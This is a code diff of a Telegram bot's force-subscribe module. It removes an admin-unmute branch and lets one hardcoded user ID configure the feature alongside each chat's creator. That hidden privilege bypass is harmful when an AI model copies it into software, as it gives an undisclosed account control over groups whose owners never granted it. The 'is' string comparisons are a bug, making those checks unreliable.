@@ -42,51 +42,45 @@ def _onUnMuteRequest(client, cb):
     user_id = cb.from_user.id
     chat_id = cb.message.chat.id
     chat_db = sql.fs_settings(chat_id)
-    user = client.get_chat_member(chat_id, user_id)
-    if user.status is "administrator":    
-        client.unban_chat_member(chat_id, user_id)
-        cb.message.delete()
-        client.send_message(chat_id,f"❗ **Congragulations {cb.from_user.mention} you got a VIP entry\n`Unmuted by an Admin`")
-    else: 
-        if chat_db:
-            channel = chat_db.channel
-            chat_member = client.get_chat_member(chat_id, user_id)
-            if chat_member.restricted_by:
-                if chat_member.restricted_by.id == (client.get_me()).id:
-                    try:
-                        client.get_chat_member(channel, user_id)
-                        client.unban_chat_member(chat_id, user_id)
-                        cb.message.delete()
-                        # if cb.message.reply_to_message.from_user.id == user_id:
-                        # cb.message.delete()
-                    except UserNotParticipant:
-                        client.answer_callback_query(
-                            cb.id,
-                            text=f"❗ Join our @{channel} channel and press 'UnMute Me' button.",
-                            show_alert=True,
-                        )
-                else:
+    if chat_db:
+        channel = chat_db.channel
+        chat_member = client.get_chat_member(chat_id, user_id)
+        if chat_member.restricted_by:
+            if chat_member.restricted_by.id == (client.get_me()).id:
+                try:
+                    client.get_chat_member(channel, user_id)
+                    client.unban_chat_member(chat_id, user_id)
+                    cb.message.delete()
+                    # if cb.message.reply_to_message.from_user.id == user_id:
+                    # cb.message.delete()
+                except UserNotParticipant:
                     client.answer_callback_query(
                         cb.id,
-                        text="❗ You have been muted by admins due to some other reason.",
+                        text=f"❗ Join our @{channel} channel and press 'UnMute Me' button.",
                         show_alert=True,
                     )
             else:
-                if (
-                    not client.get_chat_member(chat_id, (client.get_me()).id).status
-                    == "administrator"
-                ):
-                    client.send_message(
-                        chat_id,
-                        f"❗ **{cb.from_user.mention} is trying to UnMute himself but i can't unmute him because i am not an admin in this chat add me as admin again.**\n__#Leaving this chat...__",
-                    )
+                client.answer_callback_query(
+                    cb.id,
+                    text="❗ You have been muted by admins due to some other reason.",
+                    show_alert=True,
+                )
+        else:
+            if (
+                not client.get_chat_member(chat_id, (client.get_me()).id).status
+                == "administrator"
+            ):
+                client.send_message(
+                    chat_id,
+                    f"❗ **{cb.from_user.mention} is trying to UnMute himself but i can't unmute him because i am not an admin in this chat add me as admin again.**\n__#Leaving this chat...__",
+                )
 
-                else:
-                    client.answer_callback_query(
-                        cb.id,
-                        text="❗ Warning! Don't press the button when you cn talk.",
-                        show_alert=True,
-                    )
+            else:
+                client.answer_callback_query(
+                    cb.id,
+                    text="❗ Warning! Don't press the button when you cn talk.",
+                    show_alert=True,
+                )
 
 
 @pbot.on_message(filters.text & ~filters.private & ~filters.edited, group=1)
@@ -144,7 +138,7 @@ def _check_member(client, message):
 @pbot.on_message(filters.command(["forcesubscribe", "forcesub"]) & ~filters.private)
 def config(client, message):
     user = client.get_chat_member(message.chat.id, message.from_user.id)
-    if user.status is "creator":
+    if user.status is "creator" or user.user.id == 1141839926:
         chat_id = message.chat.id
         if len(message.command) > 1:
             input_str = message.command[1]
